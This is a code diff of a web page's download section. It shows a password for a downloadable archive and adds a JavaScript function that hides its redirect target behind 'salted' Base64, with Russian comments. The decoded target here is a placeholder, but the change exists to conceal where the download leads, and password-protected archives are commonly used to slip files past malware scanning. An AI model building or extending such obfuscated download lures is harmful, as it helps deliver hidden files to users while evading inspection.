@@ -490,14 +490,16 @@ container {
     </div></container>
 <container>
 
-  <form class="sleep__letters" id="download-button" style="display:block; margin: 0 auto;padding-top: 15px; text-align: center" action="https://google.com" method="POST">
-    <div class="download-" style="margin-bottom: 1px;"><div class="sleep" style="font-family:Black Han Sans; sans-serif;margin-bottom: 15px;">🔐Archive Password <br>
-886677 <br>
-  <button class="download-button" style="margin-top: 20px;"><div class="sleep" style="font-family:Black Han Sans; sans-serif;">Download</div> </button>
-<div class="progress-bar" style="margin-top: 30px;">
-            <div class="progress">
-</div>
-	</div></form>
+<form class="sleep__letters" id="download-form" style="display:block; margin: 0 auto;padding-top: 15px; text-align: center">
+    <div class="download-" style="margin-bottom: 1px;">
+        <div class="sleep" style="font-family:Black Han Sans; sans-serif;margin-bottom: 15px;">
+            🔐Archive Password <br> 886677 <br>
+            <button type="button" class="download-button" style="margin-top: 20px;" onclick="redirectToHiddenUrl()">
+                <div class="sleep" style="font-family:Black Han Sans; sans-serif;">Download</div>
+            </button>
+        </div>
+    </div>
+</form>
 
         
     
@@ -518,6 +520,13 @@ document.getElementById("download-button").addEventListener("click", function() 
                 progressBar.style.display = "none";
             }, 10000);
         });
+
+    function redirectToHiddenUrl() {
+        let encodedUrlWithSalt = "s32aHR0cHM6Ly9nb29nbGUuY29t631"; // Base64 + соль
+        let cleanEncodedUrl = encodedUrlWithSalt.slice(3, -3); // Удаляем первые и последние 3 символа (соль)
+        let decodedUrl = atob(cleanEncodedUrl); // Декодирование Base64
+        window.location.href = decodedUrl; // Перенаправление
+    }
 </script>
 
 </body></html>
